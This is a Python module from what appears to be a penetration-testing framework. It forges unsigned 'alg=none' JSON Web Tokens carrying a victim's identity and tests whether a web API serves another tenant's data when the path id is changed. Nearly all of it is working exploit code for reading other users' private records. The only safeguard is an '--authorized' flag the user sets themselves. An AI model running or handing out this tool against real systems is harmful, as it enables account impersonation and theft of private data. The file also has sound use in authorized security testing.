#!/usr/bin/env python3
"""
token_probes.py — Phase 5 (part 2): IDENTITY / TOKEN PRIMITIVES.

Authorization on mature targets often hinges on the token: a JWT the server decodes but does
not verify (alg=none / kid confusion), a scope/tenant claim it trusts over the real identity,
a tenant-id it reads from the path instead of the token. This module turns those into ONE thing
the proven path already confirms: a CROSS-OWNER READ. It crafts a manipulated credential, uses
it to read a victim's object, and confirms ONLY by Δstate (the response carries another owner's
private fields) — never by "the forged token was accepted" alone.

Probes (each ends in a cross-owner Δstate read, judged by the engine's object-access law):
  * ALG-NONE forgery      : re-sign the attacker's JWT with alg=none and the VICTIM's sub, then
                            read the victim's object. Confirmed iff the read returns the victim's
                            private data (server accepted the unverified token).
  * TENANT MISMATCH       : keep the attacker's valid token but point the tenant/path id at the
                            victim's tenant. Confirmed iff cross-tenant data comes back.

ZERO-FP: a hardened server rejects the forged/mismatched credential (401/403) or returns the
attacker's own data (server-ignores-claim) → no cross-owner Δstate → nothing confirmed. The
verdict is the same object-access Δstate the whole system rests on.
"""
from __future__ import annotations
import json, argparse, sys, os, base64
from urllib.parse import urlparse
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import onyx_recon as OR


def _b64url(obj):
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _decode_jwt(token):
    t = token[7:] if token.lower().startswith("bearer ") else token
    parts = t.split(".")
    if len(parts) < 2:
        return None, None
    def dec(seg):
        seg += "=" * (-len(seg) % 4)
        try: return json.loads(base64.urlsafe_b64decode(seg))
        except Exception: return {}
    return dec(parts[0]), dec(parts[1])


def forge_alg_none(token, claim_overrides):
    """Return an alg=none JWT copying the token's claims with overrides applied, empty signature."""
    hdr, payload = _decode_jwt(token)
    if payload is None:
        return None
    hdr = {"alg": "none", "typ": "JWT"}
    payload = {**(payload or {}), **claim_overrides}
    return f"{_b64url(hdr)}.{_b64url(payload)}."


def _read(client, url, token):
    try:
        r = client.req("GET", url, token=token)
        body = r.json() if 200 <= r.status_code < 300 else None
        return r.status_code, (body if isinstance(body, dict) else None)
    except Exception:
        return 0, None


def _substantive(body, oid):
    return {k: v for k, v in (body or {}).items()
            if k.lower() != "id" and not isinstance(v, (dict, list)) and v != oid}


def probe_alg_none(base_url, attacker_token, victim, *, scope=None, researcher="", verify=True):
    """victim = {"sub": <victim subject claim>, "read_path": "/api/me/profile"|"/api/orders/{id}",
    "oid": <victim object id if path has {id}>, "expect_owner_field": {"owner": "<victim>"}}.
    Confirmed iff the forged (alg=none, victim sub) token returns the victim's private data that
    the attacker's OWN token does not."""
    host = urlparse(base_url).hostname
    cli = OR.Client(scope or [host], researcher=researcher, verify=verify)
    base = base_url.rstrip("/")
    forged = forge_alg_none(attacker_token, {"sub": victim["sub"], **victim.get("claims", {})})
    if not forged:
        return {"confirmed": False, "reason": "attacker token is not a decodable JWT"}
    path = victim["read_path"].replace("{id}", str(victim.get("oid", "")))
    url = base + path
    fs, fbody = _read(cli, url, forged)                  # forged read
    as_, abody = _read(cli, url, attacker_token)         # attacker's own read (baseline)
    if not (200 <= fs < 300) or not fbody:
        return {"confirmed": False, "reason": f"forged token rejected ({fs}) — signature verified"}
    vic_fields = _substantive(fbody, victim.get("oid"))
    # must expose the victim's data, distinct from the attacker's own
    own_fields = _substantive(abody, victim.get("oid")) if abody else {}
    distinct = {k: v for k, v in vic_fields.items() if own_fields.get(k) != v}
    exp = victim.get("expect_owner_field") or {}
    owner_match = all(str(fbody.get(k)) == str(v) for k, v in exp.items()) if exp else bool(distinct)
    confirmed = bool(distinct) and owner_match
    return {"confirmed": confirmed, "forged_status": fs, "victim_fields": vic_fields,
            "reason": ("alg=none forgery accepted → read victim's private data (cross-owner Δstate)"
                       if confirmed else "no cross-owner data returned (server-ignores-claim or own data)")}


def probe_tenant_mismatch(base_url, attacker_token, victim, *, scope=None, researcher="", verify=True):
    """Keep the attacker's VALID token but address the victim's tenant/object id. Confirmed iff
    cross-tenant private data returns (the server trusts the path/param over the token)."""
    host = urlparse(base_url).hostname
    cli = OR.Client(scope or [host], researcher=researcher, verify=verify)
    base = base_url.rstrip("/")
    vpath = victim["read_path"].replace("{id}", str(victim.get("oid", "")))
    apath = victim.get("own_path", victim["read_path"]).replace("{id}", str(victim.get("own_oid", "")))
    vs, vbody = _read(cli, base + vpath, attacker_token)      # attacker token, victim's id
    as_, abody = _read(cli, base + apath, attacker_token)     # attacker token, own id
    if not (200 <= vs < 300) or not vbody:
        return {"confirmed": False, "reason": f"cross-tenant read rejected ({vs})"}
    vic = _substantive(vbody, victim.get("oid")); own = _substantive(abody, victim.get("own_oid")) if abody else {}
    distinct = {k: v for k, v in vic.items() if own.get(k) != v}
    exp = victim.get("expect_owner_field") or {}
    owner_match = all(str(vbody.get(k)) == str(v) for k, v in exp.items()) if exp else bool(distinct)
    confirmed = bool(distinct) and owner_match
    return {"confirmed": confirmed, "status": vs, "victim_fields": vic,
            "reason": ("token trusted the path/tenant over identity → cross-tenant read (Δstate)"
                       if confirmed else "server scoped by token, not path — no cross-tenant data")}


def main(argv=None):
    ap = argparse.ArgumentParser(description="ONYX token probes — JWT alg=none / tenant mismatch → confirmed by cross-owner Δstate only.")
    ap.add_argument("--authorized", action="store_true")
    ap.add_argument("--base-url", required=True)
    ap.add_argument("--attacker-token", required=True)
    ap.add_argument("--victim", required=True, help="JSON victim spec")
    ap.add_argument("--probe", choices=["alg-none", "tenant"], required=True)
    ap.add_argument("--scope"); ap.add_argument("--researcher", default="")
    args = ap.parse_args(argv)
    if not args.authorized:
        sys.exit("Refusing to run: pass --authorized (you affirm scope + permission).")
    victim = json.loads(args.victim)
    scope = [h.strip() for h in args.scope.split(",")] if args.scope else None
    fn = probe_alg_none if args.probe == "alg-none" else probe_tenant_mismatch
    res = fn(args.base_url, args.attacker_token, victim, scope=scope, researcher=args.researcher)
    print(f"CONFIRMED={res['confirmed']}  {res['reason']}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
